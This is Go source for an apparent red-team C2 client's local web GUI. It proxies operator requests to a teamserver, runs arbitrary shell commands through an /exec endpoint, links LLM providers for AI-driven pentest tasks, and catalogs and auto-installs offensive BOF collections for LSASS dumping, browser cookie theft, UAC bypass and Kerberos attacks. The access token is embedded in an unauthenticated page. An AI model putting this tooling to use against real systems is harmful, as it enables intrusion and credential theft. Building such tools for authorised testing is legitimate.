package client

// gui.go — local web GUI server. Serves the operator HTML interface at
// 127.0.0.1:PORT and proxies all API requests to the teamserver via the
// existing mTLS operator connection. The token is injected into the HTML so
// the browser auto-logs in without any manual copy-paste.

import (
	"bufio"
	"context"
	"crypto/rand"
	"crypto/tls"
	"embed"
	"encoding/hex"
	"encoding/json"
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"io/fs"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"time"
)

//go:embed web/index.html
var guiFS embed.FS

// BuildCommit is the git short hash baked in at compile time via
// -ldflags "-X 'redteam/client.BuildCommit=$(git rev-parse --short HEAD)'".
// Defaults to "dev" when built without the Makefile.
var BuildCommit = "dev"

var guiToken string

func genGUIToken() string {
	b := make([]byte, 16)
	rand.Read(b)
	guiToken = hex.EncodeToString(b)
	return guiToken
}

// guiState tracks the currently running GUI server so it can be stopped.
var guiState struct {
	mu   sync.Mutex
	srv  *http.Server
	port int
	tok  string
}

// GUIStatus returns whether the GUI is currently running, plus its port and token.
func GUIStatus() (running bool, port int, token string) {
	guiState.mu.Lock()
	defer guiState.mu.Unlock()
	return guiState.srv != nil, guiState.port, guiState.tok
}

// StopGUI shuts down the running GUI server. Returns an error if none is running.
func StopGUI() error {
	guiState.mu.Lock()
	srv := guiState.srv
	guiState.mu.Unlock()
	if srv == nil {
		return fmt.Errorf("GUI is not running")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	err := srv.Shutdown(ctx)
	guiState.mu.Lock()
	guiState.srv = nil
	guiState.port = 0
	guiState.tok = ""
	guiState.mu.Unlock()
	return err
}

// StartGUI starts the web GUI server on host:port.
// The GUI proxies all /api/* and /events requests to the teamserver via mTLS.
// Returns an error if a GUI is already running.
func StartGUI(c *Client, host string, port int) (string, error) {
	guiState.mu.Lock()
	if guiState.srv != nil {
		existing := guiState.port
		guiState.mu.Unlock()
		return "", fmt.Errorf("GUI already running on :%d (use 'gui stop' first)", existing)
	}
	guiState.mu.Unlock()

	tok := genGUIToken()

	// SSE needs a client without timeout so long-lived streams aren't cut.
	sseClient := &http.Client{Transport: c.http.Transport}

	p := &guiProxy{c: c, sse: sseClient}
	mux := http.NewServeMux()

	mux.HandleFunc("/events", p.authMid(p.proxySSE))
	mux.HandleFunc("/token", p.tokenCheck)
	mux.HandleFunc("/api/", p.authMid(p.proxyAPI))
	mux.HandleFunc("/exec", p.authMid(p.execSSE))   // local operator shell
	mux.HandleFunc("/pathcomp", p.authMid(p.handlePathComp)) // local path completion
	mux.HandleFunc("/bofs", p.authMid(p.handleBofs)) // BOF list + resolve
	mux.HandleFunc("/browse/ls",     p.authMid(p.handleBrowseLS))     // file browser
	mux.HandleFunc("/browse/drives", p.authMid(p.handleBrowseDrives)) // list drives
	mux.HandleFunc("/browse/shares", p.authMid(p.handleBrowseShares)) // list net shares
	mux.HandleFunc("/browse/ps",     p.authMid(p.handleBrowsePS))     // process browser
	mux.HandleFunc("/ai/pentest",   p.authMid(p.handleAIPentest))
	mux.HandleFunc("/ai/stream",    p.authMid(p.handleAIStream))
	mux.HandleFunc("/ai/step",      p.authMid(p.handleAIStep))
	mux.HandleFunc("/ai/ollama-url",    p.authMid(p.handleOllamaURL))
	mux.HandleFunc("/ai/ollama-models", p.authMid(p.handleOllamaModels))
	mux.HandleFunc("/ai/c2-context",   p.authMid(p.handleAIC2Context))
	mux.HandleFunc("/ai/console-chat", p.authMid(p.handleAIConsoleChat))
	mux.HandleFunc("/ai/console-task", p.authMid(p.handleAIConsoleTask))
	mux.HandleFunc("/ai/claude-auth",     p.authMid(p.handleClaudeAuth))
	mux.HandleFunc("/ai/openai-auth", p.authMid(p.handleOpenAIAuth))
	mux.HandleFunc("/ai/openai-models", p.authMid(p.handleOpenAIModels))
	mux.HandleFunc("/ai/responder-logs",  p.authMid(p.handleResponderLogs))
	mux.HandleFunc("/version", p.handleVersion) // no auth: checked before login to show update banner
	mux.HandleFunc("/", p.serveStatic) // no auth: token is injected into the HTML itself

	srv := &http.Server{
		Addr:        fmt.Sprintf("%s:%d", host, port),
		Handler:     mux,
		ReadTimeout: 30 * time.Second,
	}

	// Bind synchronously so port conflicts surface as an error to the caller.
	ln, err := net.Listen("tcp", srv.Addr)
	if err != nil {
		return "", fmt.Errorf("bind %s:%d: %w", host, port, err)
	}

	guiState.mu.Lock()
	guiState.srv = srv
	guiState.port = port
	guiState.tok = tok
	guiState.mu.Unlock()

	go func() {
		if err := srv.Serve(ln); err != http.ErrServerClosed {
			fmt.Printf("[!] GUI: %v\n", err)
		}
	}()
	return tok, nil
}

type guiProxy struct {
	c   *Client
	sse *http.Client
}

func (p *guiProxy) authMid(h http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		tok := ""
		if auth := r.Header.Get("Authorization"); strings.HasPrefix(auth, "Bearer ") {
			tok = strings.TrimPrefix(auth, "Bearer ")
		}
		if tok == "" {
			tok = r.URL.Query().Get("token")
		}
		if tok != guiToken {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusUnauthorized)
			json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "unauthorized"})
			return
		}
		h(w, r)
	}
}

func (p *guiProxy) tokenCheck(w http.ResponseWriter, r *http.Request) {
	tok := r.URL.Query().Get("token")
	if tok == "" {
		if auth := r.Header.Get("Authorization"); strings.HasPrefix(auth, "Bearer ") {
			tok = strings.TrimPrefix(auth, "Bearer ")
		}
	}
	w.Header().Set("Content-Type", "application/json")
	if tok == guiToken {
		json.NewEncoder(w).Encode(map[string]any{"ok": true})
	} else {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "invalid token"})
	}
}

// currentGitCommit returns the short hash of HEAD in the working repo.
// Returns "" if git is not available or the binary is not inside a repo.
func currentGitCommit() string {
	out, err := exec.Command("git", "rev-parse", "--short", "HEAD").Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

// handleVersion returns build-time and current git commits so the browser
// can alert the operator when a new push has not been rebuilt yet.
func (p *guiProxy) handleVersion(w http.ResponseWriter, r *http.Request) {
	current := currentGitCommit()
	outdated := current != "" && BuildCommit != "dev" && current != BuildCommit
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"build_commit":   BuildCommit,
		"current_commit": current,
		"outdated":       outdated,
	})
}

// serveStatic injects the GUI token as window.__GUI_TOKEN__ so the page
// auto-logs in without requiring manual token entry.
func (p *guiProxy) serveStatic(w http.ResponseWriter, r *http.Request) {
	data, err := guiFS.ReadFile("web/index.html")
	if err != nil {
		http.Error(w, "GUI unavailable", http.StatusNotFound)
		return
	}
	// Inject token + version into JS globals. Version = guiToken so it changes
	// every restart; the page self-reloads when the stored version differs.
	origin := "http://" + r.Host
	injection := fmt.Sprintf(
		`<script>window.__GUI_TOKEN__=%q;window.__GUI_VER__=%q;</script></head>`,
		guiToken, guiToken,
	)
	html := strings.Replace(string(data), "</head>", injection, 1)
	html = strings.Replace(html, `id="login-url" value=""`, `id="login-url" value="`+origin+`"`, 1)
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate")
	w.Header().Set("Pragma", "no-cache")
	w.Header().Set("Expires", "0")
	fmt.Fprint(w, html)
}

// proxyAPI forwards REST requests to the teamserver's operator API via mTLS.
// The Authorization header carrying the GUI token is stripped; the mTLS cert
// on the connection handles operator authentication on the server side.
// proxyWebSocket tunnels a WebSocket upgrade request through to the mTLS backend.
// Standard HTTP proxying cannot handle WebSocket upgrades, so we create a raw TLS
// connection, forward the upgrade handshake, then bidirectionally copy.
func (p *guiProxy) proxyWebSocket(w http.ResponseWriter, r *http.Request) {
	backendURL, err := url.Parse(p.c.base)
	if err != nil {
		http.Error(w, "parse backend: "+err.Error(), http.StatusInternalServerError)
		return
	}
	host := backendURL.Host

	var backendConn net.Conn
	if t, ok := p.c.http.Transport.(*http.Transport); ok && t.TLSClientConfig != nil {
		backendConn, err = tls.Dial("tcp", host, t.TLSClientConfig)
	} else {
		backendConn, err = net.Dial("tcp", host)
	}
	if err != nil {
		http.Error(w, "dial backend: "+err.Error(), http.StatusBadGateway)
		return
	}
	defer backendConn.Close()

	// Forward the upgrade request to the backend (strip Authorization — backend uses cert auth)
	req, err := http.NewRequest(r.Method, p.c.base+r.URL.RequestURI(), nil)
	if err != nil {
		http.Error(w, "build req: "+err.Error(), http.StatusInternalServerError)
		return
	}
	for k, vs := range r.Header {
		lk := strings.ToLower(k)
		if lk == "authorization" || lk == "host" {
			continue
		}
		req.Header[k] = vs
	}
	req.Host = host
	if err := req.Write(backendConn); err != nil {
		http.Error(w, "write req: "+err.Error(), http.StatusBadGateway)
		return
	}

	// Read the 101 Switching Protocols response from backend
	backendBufr := bufio.NewReader(backendConn)
	resp, err := http.ReadResponse(backendBufr, req)
	if err != nil {
		http.Error(w, "read resp: "+err.Error(), http.StatusBadGateway)
		return
	}
	if resp.StatusCode != http.StatusSwitchingProtocols {
		http.Error(w, fmt.Sprintf("backend returned %d, want 101", resp.StatusCode), http.StatusBadGateway)
		return
	}

	// Hijack the browser connection
	hj, ok := w.(http.Hijacker)
	if !ok {
		http.Error(w, "hijack not supported", http.StatusInternalServerError)
		return
	}
	browserConn, browserBufr, err := hj.Hijack()
	if err != nil {
		return
	}
	defer browserConn.Close()

	// Write just the 101 response headers to the browser (no body — the body IS the WS stream).
	// We cannot use resp.Write because for 101 responses Go treats the body as the live
	// connection, so Write would try to stream WebSocket frames as HTTP body, corrupting it.
	resp.Body.Close()
	fmt.Fprintf(browserConn, "HTTP/1.1 101 Switching Protocols\r\n")
	for k, vs := range resp.Header {
		for _, v := range vs {
			fmt.Fprintf(browserConn, "%s: %s\r\n", k, v)
		}
	}
	fmt.Fprintf(browserConn, "\r\n")

	// Bidirectionally copy WebSocket frames, draining buffered readers first
	done := make(chan struct{}, 2)
	go func() {
		io.Copy(backendConn, browserBufr)
		done <- struct{}{}
	}()
	go func() {
		io.Copy(browserConn, backendBufr)
		done <- struct{}{}
	}()
	<-done
}

func (p *guiProxy) proxyAPI(w http.ResponseWriter, r *http.Request) {
	// WebSocket upgrade requests need special tunneling — HTTP proxying doesn't work.
	if strings.EqualFold(r.Header.Get("Upgrade"), "websocket") {
		p.proxyWebSocket(w, r)
		return
	}

	target := p.c.base + r.URL.RequestURI()

	pr, err := http.NewRequestWithContext(r.Context(), r.Method, target, r.Body)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	for k, vs := range r.Header {
		lk := strings.ToLower(k)
		if lk == "authorization" || lk == "host" {
			continue
		}
		pr.Header[k] = vs
	}

	// Use the no-timeout client for streaming endpoints, long-running commands, and builds.
	// /api/build can take several minutes (Rust, garble) — the 30s default times out.
	httpClient := p.c.http
	if r.URL.Query().Get("stream") == "1" ||
		strings.HasSuffix(r.URL.Path, "/stager/run") ||
		r.URL.Path == "/api/build" {
		httpClient = p.sse
	}

	resp, err := httpClient.Do(pr)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	for k, vs := range resp.Header {
		for _, v := range vs {
			w.Header().Add(k, v)
		}
	}
	w.WriteHeader(resp.StatusCode)

	// For SSE streaming responses, flush after each chunk so the browser
	// sees events immediately rather than buffering the whole response.
	if strings.Contains(resp.Header.Get("Content-Type"), "text/event-stream") {
		flusher, ok := w.(http.Flusher)
		if ok {
			buf := make([]byte, 4096)
			for {
				n, rerr := resp.Body.Read(buf)
				if n > 0 {
					w.Write(buf[:n]) //nolint:errcheck
					flusher.Flush()
				}
				if rerr != nil {
					break
				}
			}
			return
		}
	}
	io.Copy(w, resp.Body)
}

// proxySSE relays the teamserver's /api/events SSE stream to the browser.
func (p *guiProxy) proxySSE(w http.ResponseWriter, r *http.Request) {
	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "SSE not supported", http.StatusInternalServerError)
		return
	}

	req, err := http.NewRequestWithContext(r.Context(), http.MethodGet, p.c.base+"/api/events", nil)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	req.Header.Set("Accept", "text/event-stream")
	req.Header.Set("Cache-Control", "no-cache")

	resp, err := p.sse.Do(req)
	if err != nil {
		http.Error(w, "event stream unavailable: "+err.Error(), http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("X-Accel-Buffering", "no")
	flusher.Flush()

	// Relay SSE lines line-by-line, flushing each one so the browser sees
	// events immediately without waiting for a buffer to fill.
	scanner := bufio.NewScanner(resp.Body)
	for scanner.Scan() {
		fmt.Fprintf(w, "%s\n", scanner.Text())
		flusher.Flush()
	}
}

// execSSE runs a shell command on the Kali host and streams stdout+stderr to
// the browser via Server-Sent Events.  Each output line becomes a
// "data: <text>\n\n" event.  A final "event: exit\ndata: <code>\n\n" signals
// completion so the browser knows when the command finished.
//
// stderr is filtered: Python exception blocks ("Exception ignored in:" /
// "Traceback (most recent call last):") are suppressed so tool cleanup
// noise (e.g. impacket Cryptodome finalizer errors) never pollutes the console.
//
// POST /exec  body: {"cmd": "certipy find ..."}
// Authenticated via authMid (same GUI token as all other endpoints).
func (p *guiProxy) execSSE(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "streaming not supported", http.StatusInternalServerError)
		return
	}

	var body struct {
		Cmd      string `json:"cmd"`
		SudoPass string `json:"sudo_pass,omitempty"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || strings.TrimSpace(body.Cmd) == "" {
		http.Error(w, "missing cmd", http.StatusBadRequest)
		return
	}

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("X-Accel-Buffering", "no")
	flusher.Flush()

	ctx, cancel := context.WithCancel(r.Context())
	defer cancel()

	// sudo commands fail without a TTY. Rewrite "sudo ..." to "sudo -S ..."
	// so it reads the password from stdin. The frontend shows a password modal
	// and sends sudo_pass in the request body.
	shCmd := body.Cmd
	var sudoStdin io.Reader
	trimmed := strings.TrimSpace(shCmd)
	if strings.HasPrefix(trimmed, "sudo ") && !strings.Contains(trimmed, " -S") {
		shCmd = strings.Replace(shCmd, "sudo ", "sudo -S ", 1)
		sudoStdin = strings.NewReader(body.SudoPass + "\n")
	}

	cmd := exec.CommandContext(ctx, "sh", "-c", shCmd)
	if sudoStdin != nil {
		cmd.Stdin = sudoStdin
	}
	// Run from the binary's directory so relative paths like payloads/ work correctly
	// regardless of where the operator started the client process.
	if exe, err := os.Executable(); err == nil {
		cmd.Dir = filepath.Dir(exe)
	}
	// Force color output: tools detect no-TTY and strip ANSI unless told otherwise.
	cmd.Env = append(os.Environ(),
		"TERM=xterm-256color",
		"COLORTERM=truecolor",
		"FORCE_COLOR=1",
		"CLICOLOR_FORCE=1",
		"ANSIBLE_FORCE_COLOR=1",
		"PYTHONUNBUFFERED=1",
	)
	// Use separate pipes for stdout and stderr: stream stdout verbatim, but
	// filter Python exception blocks from stderr so that tool cleanup noise
	// (e.g. impacket's Cryptodome finalizer) never pollutes the console.
	outR, outW, err := os.Pipe()
	if err != nil {
		fmt.Fprintf(w, "data: [error] %s\n\nevent: exit\ndata: 1\n\n", err.Error())
		flusher.Flush()
		return
	}
	errR, errW, err2 := os.Pipe()
	if err2 != nil {
		outW.Close()
		outR.Close()
		fmt.Fprintf(w, "data: [error] %s\n\nevent: exit\ndata: 1\n\n", err2.Error())
		flusher.Flush()
		return
	}
	cmd.Stdout = outW
	cmd.Stderr = errW
	if err := cmd.Start(); err != nil {
		outW.Close()
		outR.Close()
		errW.Close()
		errR.Close()
		fmt.Fprintf(w, "data: [error] %s\n\nevent: exit\ndata: 1\n\n", err.Error())
		flusher.Flush()
		return
	}
	// Close write ends in this process so readers reach EOF when child exits.
	outW.Close()
	errW.Close()

	type sseLine struct{ text string }
	ch := make(chan sseLine, 256)
	var wg sync.WaitGroup

	// goroutine 1: stream all stdout lines
	wg.Add(1)
	go func() {
		defer wg.Done()
		sc := bufio.NewScanner(outR)
		sc.Split(scanCRLFLines)
		for sc.Scan() {
			ch <- sseLine{sc.Text()}
		}
		outR.Close()
	}()

	// goroutine 2: stream stderr, suppressing Python exception/traceback blocks
	wg.Add(1)
	go func() {
		defer wg.Done()
		sc := bufio.NewScanner(errR)
		sc.Split(scanCRLFLines)
		inPyExc := false
		for sc.Scan() {
			line := sc.Text()
			stripped := strings.TrimSpace(line)
			// Detect the start of a Python exception block (destructor errors, etc.)
			if strings.HasPrefix(stripped, "Exception ignored in:") ||
				strings.HasPrefix(stripped, "Traceback (most recent call last):") {
				inPyExc = true
			}
			if inPyExc {
				// A blank line or a line that doesn't look like traceback content
				// ends the suppression block.
				if stripped == "" {
					inPyExc = false
				}
				continue
			}
			ch <- sseLine{line}
		}
		errR.Close()
	}()

	// Close channel once both goroutines finish.
	go func() {
		wg.Wait()
		close(ch)
	}()

	for msg := range ch {
		fmt.Fprintf(w, "data: %s\n\n", msg.text)
		flusher.Flush()
	}

	exitCode := 0
	if err := cmd.Wait(); err != nil {
		if ee, ok2 := err.(*exec.ExitError); ok2 {
			exitCode = ee.ExitCode()
		} else {
			exitCode = 1
		}
	}
	fmt.Fprintf(w, "event: exit\ndata: %d\n\n", exitCode)
	flusher.Flush()
}

// scanCRLFLines is a bufio.SplitFunc that splits on \r, \n, or \r\n.
// This ensures that \r-terminated progress bar lines (e.g. from rich/netexec)
// are sent as individual SSE events so the JS noise filter can drop them.
func scanCRLFLines(data []byte, atEOF bool) (advance int, token []byte, err error) {
	if atEOF && len(data) == 0 {
		return 0, nil, nil
	}
	for i := 0; i < len(data); i++ {
		if data[i] == '\n' {
			return i + 1, data[:i], nil
		}
		if data[i] == '\r' {
			if i+1 < len(data) && data[i+1] == '\n' {
				return i + 2, data[:i], nil
			}
			return i + 1, data[:i], nil
		}
	}
	if atEOF {
		return len(data), data, nil
	}
	return 0, nil, nil
}

// handlePathComp serves GET /pathcomp?path=<partial> and returns local filesystem completions.
func (p *guiProxy) handlePathComp(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	partial := r.URL.Query().Get("path")
	if partial == "" {
		json.NewEncoder(w).Encode(map[string]any{"completions": []string{}})
		return
	}
	if strings.HasPrefix(partial, "~/") {
		if home, err := os.UserHomeDir(); err == nil {
			partial = filepath.Join(home, partial[2:])
		}
	}
	var dir, prefix string
	if strings.HasSuffix(partial, "/") {
		dir, prefix = partial, ""
	} else {
		dir, prefix = filepath.Dir(partial), filepath.Base(partial)
	}
	entries, err := os.ReadDir(dir)
	if err != nil {
		json.NewEncoder(w).Encode(map[string]any{"completions": []string{}})
		return
	}
	comps := make([]string, 0, 20)
	for _, e := range entries {
		name := e.Name()
		if prefix != "" && !strings.HasPrefix(name, prefix) {
			continue
		}
		p := filepath.Join(dir, name)
		if e.IsDir() {
			p += "/"
		}
		comps = append(comps, p)
		if len(comps) >= 50 {
			break
		}
	}
	json.NewEncoder(w).Encode(map[string]any{"completions": comps})
}

// handleBofs serves GET /bofs (list) and POST /bofs (resolve name → payload).
func (p *guiProxy) handleBofs(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	action := r.URL.Query().Get("action")

	// POST ?action=install — clone/pull BOF collections (all or one custom repo)
	if r.Method == "POST" && action == "install" {
		bofDir := getBofDir()
		os.MkdirAll(bofDir, 0755)
		type repo struct{ label, url, dir string }

		// Check for custom single-repo body: {url, dir}
		var customReq struct {
			URL string `json:"url"`
			Dir string `json:"dir"`
		}
		if ct := r.Header.Get("Content-Type"); strings.Contains(ct, "application/json") {
			_ = json.NewDecoder(r.Body).Decode(&customReq)
		}

		var repos []repo
		if customReq.URL != "" {
			dir := customReq.Dir
			if dir == "" {
				base := filepath.Base(customReq.URL)
				dir = strings.TrimSuffix(base, ".git")
			}
			// Validate: only allow https:// github/gitlab URLs, no path traversal
			if !strings.HasPrefix(customReq.URL, "https://") || strings.ContainsAny(dir, "/\\..") {
				json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "invalid url or dir"})
				return
			}
			repos = []repo{{dir, customReq.URL, dir}}
		} else {
			repos = []repo{
				{"BofAllTheThings", "https://github.com/N7WEra/BofAllTheThings", "BofAllTheThings"},
				{"situational-awareness", "https://github.com/TrustedSec/CS-Situational-Awareness-BOF", "situational-awareness"},
				{"nanodump", "https://github.com/fortra/nanodump", "nanodump"},
				{"outflank", "https://github.com/outflanknl/C2-Tool-Collection", "outflank"},
				{"ajpc500", "https://github.com/ajpc500/BOFs", "ajpc500"},
			}
		}

		// No TTY available — prevent git from hanging waiting for credentials.
		gitEnv := append(os.Environ(), "GIT_TERMINAL_PROMPT=0")

		gitCmd := func(args ...string) ([]byte, error) {
			c := exec.Command("git", args...)
			c.Env = gitEnv
			return c.CombinedOutput()
		}

		var lines []string
		for _, rp := range repos {
			dest := filepath.Join(bofDir, rp.dir)
			var out []byte
			var err error
			if _, e := os.Stat(filepath.Join(dest, ".git")); e == nil {
				out, err = gitCmd("-C", dest, "pull", "-q", "--ff-only")
				lines = append(lines, fmt.Sprintf("[~] %s: %s", rp.label, strings.TrimSpace(string(out))))
			} else {
				out, err = gitCmd("clone", "-q", "--depth", "1", rp.url, dest)
				if err != nil {
					lines = append(lines, fmt.Sprintf("[!] %s: %s", rp.label, strings.TrimSpace(string(out))))
				} else {
					lines = append(lines, fmt.Sprintf("[+] %s: cloned", rp.label))
				}
			}
			// Auto-compile: if repo has no .o files but has a Makefile, run make.
			// Search order: root Makefile, then first-level subdirectory Makefile.
			if err == nil {
				hasDotO := false
				filepath.WalkDir(dest, func(p string, d fs.DirEntry, _ error) error {
					if !d.IsDir() && strings.HasSuffix(p, ".o") { hasDotO = true }
					return nil
				})
				if !hasDotO {
					makeDir := ""
					// Check root Makefile first
					if _, e := os.Stat(filepath.Join(dest, "Makefile")); e == nil {
						makeDir = dest
					} else {
						// Check one level deep (e.g. outflank uses BOF/Makefile)
						entries, _ := os.ReadDir(dest)
						for _, entry := range entries {
							if !entry.IsDir() { continue }
							if _, e := os.Stat(filepath.Join(dest, entry.Name(), "Makefile")); e == nil {
								makeDir = filepath.Join(dest, entry.Name())
								break
							}
						}
					}
					if makeDir != "" {
						lines = append(lines, fmt.Sprintf("[*] %s: no .o files found — running make…", rp.label))
						out, err = exec.Command("make", "-C", makeDir).CombinedOutput()
						if err != nil {
							lines = append(lines, fmt.Sprintf("[!] %s: make failed: %s", rp.label, strings.TrimSpace(string(out))))
						} else {
							n := 0
							filepath.WalkDir(dest, func(p string, d fs.DirEntry, _ error) error {
								if !d.IsDir() && strings.HasSuffix(p, ".o") { n++ }
								return nil
							})
							lines = append(lines, fmt.Sprintf("[+] %s: compiled %d .o files", rp.label, n))
						}
					}
				}
			}
			_ = err
		}
		total := len(bofNames())
		json.NewEncoder(w).Encode(map[string]any{"ok": true, "lines": lines, "total": total})
		return
	}

	// GET ?action=catalog — return curated BOF collection list with install status
	if r.Method == "GET" && action == "catalog" {
		type catalogEntry struct {
			ID          string `json:"id"`
			Name        string `json:"name"`
			URL         string `json:"url"`
			Description string `json:"description"`
			Installed   bool   `json:"installed"`
		}
		bofDir := getBofDir()
		catalog := []catalogEntry{
			// ── Large Collections ──────────────────────────────────────────────────────
			{"situational-awareness", "CS-Situational-Awareness-BOF", "https://github.com/TrustedSec/CS-Situational-Awareness-BOF", "TrustedSec: whoami, arp, ldapsearch, nslookup, netshares, schtasksenum, ADCS enum and more (70+ BOFs)", false},
			{"CS-Remote-OPs-BOF", "CS-Remote-OPs-BOF", "https://github.com/trustedsec/CS-Remote-OPs-BOF", "TrustedSec: remote process injection, service control, scheduled tasks, token steal (50+ BOFs)", false},
			{"outflank", "C2-Tool-Collection", "https://github.com/outflanknl/C2-Tool-Collection", "Outflank: Kerberoast, Klist, Lapsdump, PetitPotam, WdToggle, ReconAD, SprayAD and more", false},
			{"nanodump", "nanodump", "https://github.com/fortra/nanodump", "Fortra: LSASS dump (full, PPL, ppl-dump), low-footprint credential extraction", false},
			{"BofAllTheThings", "BofAllTheThings", "https://github.com/N7WEra/BofAllTheThings", "Community aggregator: compiled BOFs from multiple authors", false},
			{"ajpc500", "BOFs (ajpc500)", "https://github.com/ajpc500/BOFs", "ajpc500: Curl, ETW patch, static syscalls LSASS dump, indirect syscalls shellcode inject", false},
			{"RiccardoAncarani-BOFs", "BOFs (RiccardoAncarani)", "https://github.com/RiccardoAncarani/BOFs", "Riccardo Ancarani: WTS remote process enum, pipe shellcode, unhook ntdll, cat", false},
			{"OperatorsKit", "OperatorsKit", "https://github.com/REDMED-X/OperatorsKit", "REDMED-X: recon, lateral movement, persistence, credential dump (large toolkit)", false},
			{"Beacon-Object-File-Library", "BOF Library (Ap3x)", "https://github.com/Ap3x/Beacon-Object-File-Library", "Ap3x: large community-compiled BOF library covering many categories", false},
			{"NioZow-bof-collection", "bof-collection (NioZow)", "https://github.com/NioZow/bof-collection", "NioZow: token impersonation, privilege escalation, injection, lateral movement", false},
			{"rvrsh3ll-BOF_Collection", "BOF_Collection (rvrsh3ll)", "https://github.com/rvrsh3ll/BOF_Collection", "rvrsh3ll: situational awareness, credential access, execution BOFs", false},
			{"Adrenaline", "Adrenaline", "https://github.com/atomiczsec/Adrenaline", "atomiczsec: all-in-one BOF collection (recon, execution, credentials, lateral movement)", false},
			{"PostEx-Arsenal", "PostEx-Arsenal", "https://github.com/entropy-z/PostEx-Arsenal", "entropy-z: post-exploitation arsenal with compiled BOFs", false},
			{"OpenBOF", "OpenBOF", "https://github.com/WKL-Sec/OpenBOF", "WKL-Sec: open BOF collection with evasion and post-ex BOFs", false},
			{"Situational-Awareness-BOFs", "Situational-Awareness-BOFs (sliver)", "https://github.com/sliverarmory/Situational-Awareness-BOFs", "Sliver port of TrustedSec SA BOFs — works with any C2", false},
			{"LDAP-Bof-Collection", "LDAP-Bof-Collection", "https://github.com/P0142/LDAP-Bof-Collection", "P0142: LDAP-based AD enumeration BOFs", false},
			{"ldap_bofs", "ldap_bofs (garrettfoster13)", "https://github.com/garrettfoster13/ldap_bofs", "garrettfoster13: LDAP reconnaissance and enumeration BOFs", false},
			{"crypt0p3g-bof-collection", "bof-collection (crypt0p3g)", "https://github.com/crypt0p3g/bof-collection", "crypt0p3g: miscellaneous post-exploitation BOFs", false},
			{"RayRRT-BOFs", "BOFs (RayRRT)", "https://github.com/RayRRT/BOFs", "RayRRT: compiled BOF collection for Cobalt Strike", false},
			{"rookuu-BOFs", "BOFs (rookuu)", "https://github.com/rookuu/BOFs", "rookuu: various post-exploitation and enumeration BOFs", false},
			{"atomic-bofs", "atomic-bofs (rasta-mouse)", "https://github.com/rasta-mouse/atomic-bofs", "rasta-mouse: atomic red team BOFs for adversary simulation", false},
			{"QoL-BOFs", "QoL-BOFs (ZephrFish)", "https://github.com/ZephrFish/QoL-BOFs", "ZephrFish: quality-of-life BOFs for day-to-day operator tasks", false},
			{"BusyBOF", "BusyBOF", "https://github.com/cmprmsd/BusyBOF", "cmprmsd: multi-purpose BOF toolkit (persistence, evasion, execution)", false},
			// ── Credentials & Kerberos ─────────────────────────────────────────────────
			{"Kerbeus-BOF", "Kerbeus-BOF", "https://github.com/RalfHacker/Kerbeus-BOF", "RalfHacker: full Kerberos attack suite (AS-REP, TGS, Golden/Silver Tickets, S4U)", false},
			{"nanorobeus", "nanorobeus", "https://github.com/wavvs/nanorobeus", "wavvs: .NET-based Kerberos toolkit as BOF (ticket request, list, purge)", false},
			{"Koh", "Koh (GhostPack)", "https://github.com/GhostPack/Koh", "GhostPack: token coercion — capture tokens when users connect to shares", false},
			{"ChromeKatz", "ChromeKatz", "https://github.com/Meckazin/ChromeKatz", "Meckazin: dump Chrome/Edge cookies and passwords from memory (BOF)", false},
			{"ADSyncDump-BOF", "ADSyncDump-BOF", "https://github.com/Paradoxis/ADSyncDump-BOF", "Paradoxis: dump Azure AD Connect sync credentials from memory", false},
			{"aggrokatz", "aggrokatz", "https://github.com/sec-consult/aggrokatz", "sec-consult: remote pypykatz parsing, NTDS/registry hive parsing BOFs", false},
			{"aad_prt_bof", "aad_prt_bof", "https://github.com/wotwot563/aad_prt_bof", "wotwot563: dump Azure AD PRT (Primary Refresh Token) for SSO attack", false},
			{"PPLFaultDumpBOF", "PPLFaultDumpBOF", "https://github.com/trustedsec/PPLFaultDumpBOF", "TrustedSec: dump PPL-protected LSASS via fault injection (no driver needed)", false},
			// ── Privilege Escalation & UAC ─────────────────────────────────────────────
			{"PrivKit", "PrivKit", "https://github.com/mertdas/PrivKit", "mertdas: automated local privilege escalation check BOF (services, DLL hijack, etc.)", false},
			{"UAC-BOF-Bonanza", "UAC-BOF-Bonanza", "https://github.com/icyguider/UAC-BOF-Bonanza", "icyguider: 10+ UAC bypass techniques as BOFs (CMSTPLUA, EventViewer, more)", false},
			{"TrustedPath-UACBypass-BOF", "TrustedPath-UACBypass", "https://github.com/netero1010/TrustedPath-UACBypass-BOF", "netero1010: UAC bypass via trusted path DLL hijacking", false},
			// ── Lateral Movement ───────────────────────────────────────────────────────
